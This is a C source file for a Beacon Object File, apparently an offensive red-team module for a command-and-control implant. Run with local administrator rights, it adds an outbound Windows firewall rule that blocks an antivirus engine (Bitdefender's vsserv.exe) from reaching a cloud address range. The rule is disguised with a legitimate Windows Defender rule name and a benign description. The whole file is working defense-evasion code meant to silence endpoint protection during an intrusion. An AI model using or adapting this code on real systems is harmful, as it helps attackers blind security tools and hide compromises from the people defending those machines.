/*
 EPP comms block - add local FW rule
 
 Credit: 
	- Microsoft
	- reenz0h (twitter: @SEKTOR7net) -> heavily dependent on course code
 
*/

#include <windows.h>
#include <stdio.h>
#include <netfw.h>
#include ".\evasion\eva-eppblk-fw-bof-imports.h"
#include ".\evasion\eva-eppblk-fw-bof-structs.h"
#include "..\beacon.h"
#include "..\bofdefs.h"
#pragma comment( lib, "ole32.lib" )
#pragma comment( lib, "oleaut32.lib" )

/*After testing, use these variables that accepts user input: (convert these vars to UNICODE first)
		char* ruleName;
		char* ruleGroup;
		char* ruleDescription;
		char* ruleApplication;
		char* ruleRuleRAddrs;
*/


// Usage: eva-eppblk-fw <ruleName> <ruleGroup> <ruleDescription> <ruleApplication> <ruleRuleRemoteAddrs>
// Pre-Requisite: Local ADMIN privs
void go(char *args, int alen) {
	datap parser;
	char* ruleName;
	char* ruleGroup;
	char* ruleDescription;
	char* ruleApplication;
	char* ruleRuleRAddrs;
	
	// Prepare data parser
	BeaconDataParse(&parser, args, alen);
	
	// Unpack Data
	ruleName 		= BeaconDataExtract(&parser, NULL);
	ruleGroup 		= BeaconDataExtract(&parser, NULL);
	ruleDescription = BeaconDataExtract(&parser, NULL);
	ruleApplication = BeaconDataExtract(&parser, NULL);
	ruleRuleRAddrs 	= BeaconDataExtract(&parser, NULL);
	
    HRESULT hrComInit 	= S_OK;
    HRESULT hr 			= S_OK;

    // Initialize COM library
    hrComInit = OLE32$CoInitializeEx(0,COINIT_APARTMENTTHREADED);
	
    if (FAILED(hrComInit)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] CoInitializeEx failed: 0x%08lx\n", hrComInit);
        goto Cleanup;        
    }

	// load NetFwPolicy2 COM
    INetFwPolicy2 * pNetFwPolicy2 = NULL;	
    hr = OLE32$CoCreateInstance(__uuidof(NetFwPolicy2), 
						NULL, 
						CLSCTX_INPROC_SERVER, 
						__uuidof(INetFwPolicy2), 
						(LPVOID *) &pNetFwPolicy2);

    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] CoCreateInstance for INetFwPolicy2 failed: 0x%08lx\n", hr);
        goto Cleanup;        
    }

    // Retrieve FW rules
    INetFwRules * pFwRules = NULL;
    hr = pNetFwPolicy2->get_Rules(&pFwRules);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] get_Rules failed: 0x%08lx\n", hr);
        goto Cleanup;
    }

    // Create a new Firewall Rule object.
	INetFwRule * pFwRule = NULL;
    hr = OLE32$CoCreateInstance(
                __uuidof(NetFwRule),
                NULL,
                CLSCTX_INPROC_SERVER,
                __uuidof(INetFwRule),
                (void**)&pFwRule);
				
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] CoCreateInstance for Firewall Rule failed: 0x%08lx\n", hr);
        goto Cleanup;
    }

	// New FW rule settings
	// After using the strings below for testing, use these variables that accepts user input: (convert these vars to UNICODE first)
	/*
		char* ruleName;
		char* ruleGroup;
		char* ruleDescription;
		char* ruleApplication;
		char* ruleRuleRAddrs;
    */
	BSTR bstrRuleName = 		OLEAUT32$SysAllocString(L"Windows Defender Firewall Remote Management (RPC)");
    BSTR bstrRuleGroup = 		OLEAUT32$SysAllocString(L"Windows Defender Firewall Remote Management (RPC)");
    BSTR bstrRuleDescription = 	OLEAUT32$SysAllocString(L"Deny malicious outbound network traffic");
    BSTR bstrRuleApplication = 	OLEAUT32$SysAllocString(L"C:\\Program Files\\Bitdefender Antivirus Free\\vsserv.exe");
	BSTR bstrRuleRAddrs = 		OLEAUT32$SysAllocString(L"54.0.0.0/8");

	long CurrentProfilesBitMask = NET_FW_PROFILE2_DOMAIN  | NET_FW_PROFILE2_PRIVATE | NET_FW_PROFILE2_PUBLIC;

    // Populate the Firewall Rule object
    pFwRule->put_Name(bstrRuleName);
    pFwRule->put_Description(bstrRuleDescription);
    pFwRule->put_ApplicationName(bstrRuleApplication);
    pFwRule->put_Protocol(NET_FW_IP_PROTOCOL_ANY);
	pFwRule->put_RemoteAddresses(bstrRuleRAddrs);
    pFwRule->put_Direction(NET_FW_RULE_DIR_OUT);
    pFwRule->put_Grouping(bstrRuleGroup);
    pFwRule->put_Profiles(CurrentProfilesBitMask);
	pFwRule->put_Action(NET_FW_ACTION_BLOCK);
    pFwRule->put_Enabled(VARIANT_TRUE);

    // Add the Firewall Rule
    hr = pFwRules->Add(pFwRule);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Firewall Rule Add failed: 0x%08lx\n", hr);
        goto Cleanup;
    }

Cleanup:
    // Free BSTR's
    OLEAUT32$SysFreeString(bstrRuleName);
    OLEAUT32$SysFreeString(bstrRuleDescription);
    OLEAUT32$SysFreeString(bstrRuleGroup);
    OLEAUT32$SysFreeString(bstrRuleApplication);
    OLEAUT32$SysFreeString(bstrRuleRAddrs);

    // Release the INetFwRule object
    if (pFwRule != NULL) {
        pFwRule->Release();
    }

    // Release the INetFwRules object
    if (pFwRules != NULL) {
        pFwRules->Release();
    }

    // Release the INetFwPolicy2 object
    if (pNetFwPolicy2 != NULL) {
        pNetFwPolicy2->Release();
    }

    // Uninitialize COM.
    if (SUCCEEDED(hrComInit)) {
        OLE32$CoUninitialize();
    }
    return;
}

